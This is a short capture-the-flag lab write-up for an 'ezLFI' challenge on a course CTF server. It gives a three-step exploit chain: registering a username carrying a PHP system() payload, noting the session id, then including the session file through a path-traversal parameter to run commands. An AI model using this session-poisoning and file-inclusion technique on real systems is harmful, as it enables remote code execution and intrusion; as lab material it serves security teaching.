# Lab0x03 Writeup

## ezLFI
1. https://edu-ctf.csie.org:10157/?action=register
user=<?php system("ls -al");
2. sessid = kje7fdu65vfrfe1tnur1cpqte2
3. finally https://edu-ctf.csie.org:10157/?action=module&m=../../../var/lib/php/session/sess_kje7fdu65vfrfe1tnur1cpqte2
